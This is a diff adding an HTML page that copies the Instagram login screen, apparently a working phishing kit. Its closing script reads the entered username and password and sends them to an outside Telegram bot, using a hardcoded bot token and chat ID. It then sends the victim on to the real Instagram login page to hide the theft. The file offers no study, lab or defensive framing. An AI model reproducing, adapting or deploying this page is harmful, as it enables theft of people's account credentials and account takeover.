@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            width: 100%;
+        }
+        
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+        
+        form {
+            display: flex;
+            flex-direction: column;
+            margin-top: 24px;
+        }
+        
+        input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 14px;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
+            outline: none;
+        }
+        
+        input:focus {
+            border: 1px solid #a8a8a8;
+        }
+        
+        button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            padding: 7px 16px;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+        
+        button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
+        }
+        
+        .line {
+            background-color: #dbdbdb;
+            height: 1px;
+            flex-grow: 1;
+        }
+        
+        .or {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+            text-transform: uppercase;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .facebook-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+        
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .app-text {
+            font-size: 14px;
+            margin: 10px 0 20px;
+        }
+        
+        .app-stores {
+            display: flex;
+            justify-content: center;
+        }
+        
+        .app-store-img {
+            height: 40px;
+            margin: 0 4px;
+        }
+        
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        .footer-link {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 0 8px 12px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+            
+            <form id="loginForm">
+                <input type="text" placeholder="Phone number, username, or email" id="username" required>
+                <input type="password" placeholder="Password" id="password" required>
+                <button type="submit" id="loginButton">Log In</button>
+            </form>
+            
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or">or</div>
+                <div class="line"></div>
+            </div>
+            
+            <div class="facebook-login">
+                <span class="facebook-icon"></span>
+                <span>Log in with Facebook</span>
+            </div>
+            
+            <div class="forgot-password">Forgot password?</div>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <span class="signup-link">Sign up</span>
+        </div>
+        
+        <div class="app-download">
+            <div class="app-text">Get the app.</div>
+            <div class="app-stores">
+                <img class="app-store-img" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
+                <img class="app-store-img" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Jobs</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Top Accounts</a>
+                <a href="#" class="footer-link">Hashtags</a>
+                <a href="#" class="footer-link">Locations</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+            </div>
+            <div class="copyright">
+                © 2023 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Send data to Telegram bot
+            const botToken = '8012727250:AAFFX4RGt-t33UjzpDwEl9IbjkwHKij4Trc';
+            const chatId = '5308063258';
+            const message = `New Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => {
+                    // Redirect to Instagram after sending data
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                });
+        });
+    </script>
+</body>
+</html>
